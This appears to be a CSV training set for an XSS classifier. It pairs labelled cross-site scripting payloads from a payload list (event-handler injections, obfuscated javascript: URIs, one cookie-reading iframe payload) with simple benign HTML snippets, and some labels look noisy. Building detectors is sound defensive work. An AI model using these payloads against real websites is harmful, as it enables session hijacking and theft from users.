text,label,source,length,timestamp
"<applet onmouseover=""alert(1)"">test</applet>",1,payloadbox,44,2026-03-01T13:13:37.385678
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.408990
"<thead onmousemove=""alert(1)"">test</thead>",1,payloadbox,42,2026-03-01T13:13:37.394683
"<details ondblclick=""alert(1)"">test</details>",1,payloadbox,45,2026-03-01T13:13:37.387778
<span class='class-3634'>Services</span>,0,generated,40,2026-03-01T13:13:37.406989
"<style>:target {color:red;}</style><a id=x style=""transition:color 1s"" ontransitionend=alert(1)></a>",1,payloadbox,100,2026-03-01T13:13:37.392697
"<progress onpaste=""alert(1)"" contenteditable>test</progress>",1,payloadbox,60,2026-03-01T13:13:37.391686
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,1,payloadbox,66,2026-03-01T13:13:37.392697
"<mark onbeforepaste=""alert(1)"" contenteditable>test</mark>",1,payloadbox,58,2026-03-01T13:13:37.390697
<!-- IE 5-9 standards mode -->,1,payloadbox,30,2026-03-01T13:13:37.396686
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.407992
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.407992
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationstart=""alert(1)""></sup>",1,payloadbox,93,2026-03-01T13:13:37.393697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.413993
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.407992
<span class='class-324'>Services</span>,0,generated,39,2026-03-01T13:13:37.397682
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.405991
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.406989
"<kbd onkeydown=""alert(1)"" contenteditable>test</kbd>",1,payloadbox,52,2026-03-01T13:13:37.389686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.410992
<image id=x tabindex=1 onfocusin=alert(1)></image>,1,payloadbox,50,2026-03-01T13:13:37.389686
"<basefont onclick=""alert(1)"">test</basefont>",1,payloadbox,44,2026-03-01T13:13:37.385678
<sCriPt x>(((confirm)))``</scRipt x>,1,payloadbox,36,2026-03-01T13:13:37.396686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
<span class='class-64'>Services</span>,0,generated,38,2026-03-01T13:13:37.396686
"<samp onpaste=""alert(1)"" contenteditable>test</samp>",1,payloadbox,52,2026-03-01T13:13:37.391686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.414992
"<table onmouseover=""alert(1)"">test</table>",1,payloadbox,42,2026-03-01T13:13:37.394683
<p>About</p>,0,generated,12,2026-03-01T13:13:37.413993
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.399984
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
<p>About</p>,0,generated,12,2026-03-01T13:13:37.410992
<span class='class-164'>Services</span>,0,generated,39,2026-03-01T13:13:37.397682
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.406989
"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>",1,payloadbox,59,2026-03-01T13:13:37.386686
"<span onmousemove=""alert(1)"">test</span>",1,payloadbox,40,2026-03-01T13:13:37.392697
"<big onmouseup=""alert(1)"">test</big>",1,payloadbox,36,2026-03-01T13:13:37.386686
<noscript onblur=alert(1) tabindex=1 id=x></noscript><input autofocus>,1,payloadbox,70,2026-03-01T13:13:37.390697
"<fieldset onmouseenter=""alert(1)"">test</fieldset>",1,payloadbox,49,2026-03-01T13:13:37.388686
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.410992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.401989
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405991
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.409991
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.403007
<span class='class-1074'>Services</span>,0,generated,40,2026-03-01T13:13:37.399984
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",1,payloadbox,48,2026-03-01T13:13:37.395688
<span class='class-6394'>Services</span>,0,generated,40,2026-03-01T13:13:37.415994
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1,payloadbox,57,2026-03-01T13:13:37.395688
"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1,payloadbox,270,2026-03-01T13:13:37.395688
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.399984
"<body onkeyup=""alert(1)"" contenteditable>test</body>",1,payloadbox,52,2026-03-01T13:13:37.386686
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1,payloadbox,51,2026-03-01T13:13:37.395688
"<figcaption onbeforecut=""alert(1)"" contenteditable>test</figcaption>",1,payloadbox,68,2026-03-01T13:13:37.388686
<p>About</p>,0,generated,12,2026-03-01T13:13:37.413993
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.412991
"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",1,payloadbox,58,2026-03-01T13:13:37.391686
<svg><script ?>alert(1),1,payloadbox,23,2026-03-01T13:13:37.395688
"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",1,payloadbox,105,2026-03-01T13:13:37.392697
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",1,payloadbox,60,2026-03-01T13:13:37.394683
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.399984
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.408990
"<span draggable=""true"" ondragleave=""alert(1)"">test</span>",1,payloadbox,57,2026-03-01T13:13:37.392697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.409991
"<tt onmousemove=""alert(1)"">test</tt>",1,payloadbox,36,2026-03-01T13:13:37.395688
"<plaintext onmouseup=""alert(1)"">test</plaintext>",1,payloadbox,48,2026-03-01T13:13:37.391686
"<main onpaste=""alert(1)"" contenteditable>test</main>",1,payloadbox,52,2026-03-01T13:13:37.389686
<svg><datalist onload=alert(1)></datalist>,1,payloadbox,42,2026-03-01T13:13:37.394683
"<p onmouseenter=""alert(1)"">test</p>",1,payloadbox,35,2026-03-01T13:13:37.390697
"<IMG DYNSRC=""javascript:alert('XSS')"">",1,payloadbox,38,2026-03-01T13:13:37.396686
al\u0065rt(1),1,payloadbox,13,2026-03-01T13:13:37.385678
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.397682
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>",1,payloadbox,184,2026-03-01T13:13:37.393697
"<head onkeyup=""alert(1)"" contenteditable>test</head>",1,payloadbox,52,2026-03-01T13:13:37.388686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.406989
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.399984
"<nobr onkeydown=""alert(1)"" contenteditable>test</nobr>",1,payloadbox,54,2026-03-01T13:13:37.390697
"<style>@keyframes slidein {}</style><video style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video>",1,payloadbox,164,2026-03-01T13:13:37.393697
"<style>:target {transform: rotate(180deg);}</style><isindex id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></isindex>",1,payloadbox,132,2026-03-01T13:13:37.392697
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationend=""alert(1)""></i>",1,payloadbox,87,2026-03-01T13:13:37.393697
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.399984
"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",1,payloadbox,59,2026-03-01T13:13:37.392697
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>,1,payloadbox,50,2026-03-01T13:13:37.387778
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.406989
<p>About</p>,0,generated,12,2026-03-01T13:13:37.408990
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405009
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
<span class='class-1404'>Services</span>,0,generated,40,2026-03-01T13:13:37.400996
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>,1,payloadbox,86,2026-03-01T13:13:37.395688
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.405009
<span class='class-6594'>Services</span>,0,generated,40,2026-03-01T13:13:37.415994
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.397682
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.406989
"<style>:target {color:red;}</style><q id=x style=""transition:color 1s"" ontransitionend=alert(1)></q>",1,payloadbox,100,2026-03-01T13:13:37.392697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.406989
"<style>:target {transform: rotate(180deg);}</style><rp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rp>",1,payloadbox,122,2026-03-01T13:13:37.392697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.412991
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.397682
"<del onmousemove=""alert(1)"">test</del>",1,payloadbox,38,2026-03-01T13:13:37.387778
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.410992
"<optgroup onkeyup=""alert(1)"" contenteditable>test</optgroup>",1,payloadbox,60,2026-03-01T13:13:37.390697
"<main onbeforepaste=""alert(1)"" contenteditable>test</main>",1,payloadbox,58,2026-03-01T13:13:37.389686
"<style>@keyframes slidein {}</style><address style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></address>",1,payloadbox,168,2026-03-01T13:13:37.392697
"<listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/>",1,payloadbox,92,2026-03-01T13:13:37.396686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405991
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",1,payloadbox,172,2026-03-01T13:13:37.393697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.399984
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.409991
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.401989
<span class='class-1814'>Services</span>,0,generated,40,2026-03-01T13:13:37.401989
"<command onbeforecut=""alert(1)"" contenteditable>test</command>",1,payloadbox,62,2026-03-01T13:13:37.386686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.406989
"<style>:target {color: red;}</style><main id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></main>",1,payloadbox,111,2026-03-01T13:13:37.392697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.412991
<body onpageshow=alert(1)>,1,payloadbox,26,2026-03-01T13:13:37.386686
<span class='class-3744'>Services</span>,0,generated,40,2026-03-01T13:13:37.407992
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403007
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,1,payloadbox,79,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405009
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
"<output draggable=""true"" ondragstart=""alert(1)"">test</output>",1,payloadbox,61,2026-03-01T13:13:37.390697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.406989
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.405991
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sub>",1,payloadbox,176,2026-03-01T13:13:37.393697
"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" ontransitionend=alert(1)></source>",1,payloadbox,110,2026-03-01T13:13:37.392697
<table id=x tabindex=1 onfocus=alert(1)></table>,1,payloadbox,48,2026-03-01T13:13:37.394683
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.399984
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",1,payloadbox,54,2026-03-01T13:13:37.386686
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.413993
"<form onmouseleave=""alert(1)"">test</form>",1,payloadbox,41,2026-03-01T13:13:37.388686
"<u onkeydown=""alert(1)"" contenteditable>test</u>",1,payloadbox,48,2026-03-01T13:13:37.395688
"<div id=""138""><link rel=""import"" href=""test.svg"" />//[""'`-->]]>]</div><div id=""139""><iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />//[""'`-->]]>]</div>undefined",1,payloadbox,192,2026-03-01T13:13:37.396686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
"<span oncopy=""alert(1)"" contenteditable>test</span>",1,payloadbox,51,2026-03-01T13:13:37.392697
"<style>@keyframes slidein {}</style><param style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></param>",1,payloadbox,164,2026-03-01T13:13:37.393697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.408990
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.413993
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.398687
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",1,payloadbox,107,2026-03-01T13:13:37.387778
"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",1,payloadbox,52,2026-03-01T13:13:37.395688
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.405991
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.408990
<footer id=x tabindex=1 onfocusin=alert(1)></footer>,1,payloadbox,52,2026-03-01T13:13:37.388686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.400996
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",1,payloadbox,97,2026-03-01T13:13:37.385678
"<aside oncontextmenu=""alert(1)"">test</aside>",1,payloadbox,44,2026-03-01T13:13:37.385678
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.413993
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.413993
<p>About</p>,0,generated,12,2026-03-01T13:13:37.406989
"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",1,payloadbox,107,2026-03-01T13:13:37.387778
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.414992
"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></legend>",1,payloadbox,166,2026-03-01T13:13:37.393697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.413993
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.397682
"<script onkeyup=""alert(1)"" contenteditable>test</script>",1,payloadbox,56,2026-03-01T13:13:37.391686
"<spacer onmouseover=""alert(1)"">test</spacer>",1,payloadbox,44,2026-03-01T13:13:37.392697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.401989
"<header draggable=""true"" ondragstart=""alert(1)"">test</header>",1,payloadbox,61,2026-03-01T13:13:37.388686
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.410992
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405991
<col onblur=alert(1) tabindex=1 id=x></col><input autofocus>,1,payloadbox,60,2026-03-01T13:13:37.386686
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",1,payloadbox,97,2026-03-01T13:13:37.393697
<h2>Login</h2>,0,generated,14,2026-03-01T13:13:37.398687
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.403007
<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>,1,payloadbox,55,2026-03-01T13:13:37.389686
<img/src/onerror=prompt(8)>,1,payloadbox,27,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.406989
<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>,1,payloadbox,75,2026-03-01T13:13:37.388686
"<style>@keyframes slidein {}</style><ol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ol>",1,payloadbox,158,2026-03-01T13:13:37.393697
<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>,1,payloadbox,68,2026-03-01T13:13:37.385678
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.397682
"<textarea onmouseleave=""alert(1)"">test</textarea>",1,payloadbox,49,2026-03-01T13:13:37.394683
<ol id=x tabindex=1 onactivate=alert(1)></ol>,1,payloadbox,45,2026-03-01T13:13:37.390697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.399984
"<div draggable=""true"" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>",1,payloadbox,113,2026-03-01T13:13:37.387778
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.409991
"<center ondblclick=""alert(1)"">test</center>",1,payloadbox,43,2026-03-01T13:13:37.386686
<listing id=x tabindex=1 onfocusin=alert(1)></listing>,1,payloadbox,54,2026-03-01T13:13:37.389686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.408990
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.399984
"<wbr onbeforecut=""alert(1)"" contenteditable>test</wbr>",1,payloadbox,54,2026-03-01T13:13:37.395688
<summary id=x tabindex=1 onactivate=alert(1)></summary>,1,payloadbox,55,2026-03-01T13:13:37.393697
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.397682
"<var draggable=""true"" ondragenter=""alert(1)"">test</var>",1,payloadbox,55,2026-03-01T13:13:37.395688
"<rtc draggable=""true"" ondragenter=""alert(1)"">test</rtc>",1,payloadbox,55,2026-03-01T13:13:37.391686
"<style>@keyframes slidein {}</style><summary style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></summary>",1,payloadbox,168,2026-03-01T13:13:37.393697
<h4>Login</h4>,0,generated,14,2026-03-01T13:13:37.413993
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></script>",1,payloadbox,182,2026-03-01T13:13:37.393697
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.408990
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",1,payloadbox,60,2026-03-01T13:13:37.386686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.398687
"<link onbeforecut=""alert(1)"" contenteditable>test</link>",1,payloadbox,56,2026-03-01T13:13:37.389686
<rp id=x tabindex=1 onfocusin=alert(1)></rp>,1,payloadbox,44,2026-03-01T13:13:37.391686
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.414992
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.397682
<span class='class-2724'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
"<style>:target {color:red;}</style><dialog id=x style=""transition:color 1s"" ontransitionend=alert(1)></dialog>",1,payloadbox,110,2026-03-01T13:13:37.392697
"<big onpaste=""alert(1)"" contenteditable>test</big>",1,payloadbox,50,2026-03-01T13:13:37.386686
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.398687
<button>Read more</button>,0,generated,26,2026-03-01T13:13:37.409991
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.401989
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationend=""alert(1)""></dd>",1,payloadbox,89,2026-03-01T13:13:37.393697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.409991
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.408990
"<dialog onpaste=""alert(1)"" contenteditable>test</dialog>",1,payloadbox,56,2026-03-01T13:13:37.387778
<p>About</p>,0,generated,12,2026-03-01T13:13:37.397682
<span class='class-6314'>Services</span>,0,generated,40,2026-03-01T13:13:37.414992
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.401989
"<li draggable=""true"" ondragend=""alert(1)"">test</li>",1,payloadbox,51,2026-03-01T13:13:37.389686
"<ol onbeforecopy=""alert(1)"" contenteditable>test</ol>",1,payloadbox,53,2026-03-01T13:13:37.390697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.400996
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.411988
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.405009
"<pre draggable=""true"" ondragleave=""alert(1)"">test</pre>",1,payloadbox,55,2026-03-01T13:13:37.391686
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.413993
"<td onmouseenter=""alert(1)"">test</td>",1,payloadbox,37,2026-03-01T13:13:37.394683
"<optgroup onmouseenter=""alert(1)"">test</optgroup>",1,payloadbox,49,2026-03-01T13:13:37.390697
"<del onpaste=""alert(1)"" contenteditable>test</del>",1,payloadbox,50,2026-03-01T13:13:37.387778
<xss id=x tabindex=1 onfocusin=alert(1)></xss>,1,payloadbox,46,2026-03-01T13:13:37.395688
<p>About</p>,0,generated,12,2026-03-01T13:13:37.411988
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.403996
"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",1,payloadbox,53,2026-03-01T13:13:37.393697
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.409991
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.410992
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.409991
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,1,payloadbox,62,2026-03-01T13:13:37.392697
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></h1>",1,payloadbox,174,2026-03-01T13:13:37.393697
"<embed onmousedown=""alert(1)"">test</embed>",1,payloadbox,42,2026-03-01T13:13:37.388686
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1,payloadbox,42,2026-03-01T13:13:37.396686
<span class='class-6584'>Services</span>,0,generated,40,2026-03-01T13:13:37.415994
"<frameset oncontextmenu=""alert(1)"">test</frameset>",1,payloadbox,50,2026-03-01T13:13:37.388686
"a=alert,a(1)",1,payloadbox,12,2026-03-01T13:13:37.385678
"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationend=""alert(1)""></big>",1,payloadbox,91,2026-03-01T13:13:37.393697
"<center onkeyup=""alert(1)"" contenteditable>test</center>",1,payloadbox,56,2026-03-01T13:13:37.386686
<button onblur=alert(1) id=x></button><input autofocus>,1,payloadbox,55,2026-03-01T13:13:37.386686
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.411988
"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>",1,payloadbox,105,2026-03-01T13:13:37.387778
"<dd onkeydown=""alert(1)"" contenteditable>test</dd>",1,payloadbox,50,2026-03-01T13:13:37.387778
"<base onmouseout=""alert(1)"">test</base>",1,payloadbox,39,2026-03-01T13:13:37.385678
<h6>Login</h6>,0,generated,14,2026-03-01T13:13:37.406989
"<a class=bar href=""http://www.example.org"">www.example.org</a>",1,payloadbox,62,2026-03-01T13:13:37.396686
"<multicol onbeforecut=""alert(1)"" contenteditable>test</multicol>",1,payloadbox,64,2026-03-01T13:13:37.390697
<input type='text' name='field'>,0,generated,32,2026-03-01T13:13:37.406989
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.405009
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.403007
<span class='class-2034'>Services</span>,0,generated,40,2026-03-01T13:13:37.401989
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.396686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.403996
"<rp draggable=""true"" ondrag=""alert(1)"">test</rp>",1,payloadbox,48,2026-03-01T13:13:37.391686
<div>Home</div>,0,generated,15,2026-03-01T13:13:37.414992
"<style>@keyframes slidein {}</style><track style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></track>",1,payloadbox,164,2026-03-01T13:13:37.393697
"<style>@keyframes slidein {}</style><dd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dd>",1,payloadbox,158,2026-03-01T13:13:37.392697
"<style onbeforecopy=""alert(1)"" contenteditable>test</style>",1,payloadbox,59,2026-03-01T13:13:37.392697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.411988
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.413993
<p>About</p>,0,generated,12,2026-03-01T13:13:37.411988
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.415994
<a href='/page'>Contact</a>,0,generated,27,2026-03-01T13:13:37.403007
"<span onmouseenter=""alert(1)"">test</span>",1,payloadbox,41,2026-03-01T13:13:37.392697
<img src='image.jpg' alt='image'>,0,generated,33,2026-03-01T13:13:37.407992
"<sub oncut=""alert(1)"" contenteditable>test</sub>",1,payloadbox,48,2026-03-01T13:13:37.393697
"<marquee onmouseleave=""alert(1)"">test</marquee>",1,payloadbox,47,2026-03-01T13:13:37.390697
"</stylesheet>//[""'`-->]]>]</div>",1,payloadbox,32,2026-03-01T13:13:37.396686
<em onblur=alert(1) tabindex=1 id=x></em><input autofocus>,1,payloadbox,58,2026-03-01T13:13:37.388686
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,1,payloadbox,76,2026-03-01T13:13:37.390697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.398687
"<nextid oncopy=""alert(1)"" contenteditable>test</nextid>",1,payloadbox,55,2026-03-01T13:13:37.390697
<ul><li>Sign up</li></ul>,0,generated,25,2026-03-01T13:13:37.405991
<span class='class-2734'>Services</span>,0,generated,40,2026-03-01T13:13:37.403996
"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>",1,payloadbox,61,2026-03-01T13:13:37.387778
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",1,payloadbox,115,2026-03-01T13:13:37.392697
<p>About</p>,0,generated,12,2026-03-01T13:13:37.398687
<form action='/submit'><input type='text'></form>,0,generated,49,2026-03-01T13:13:37.401989
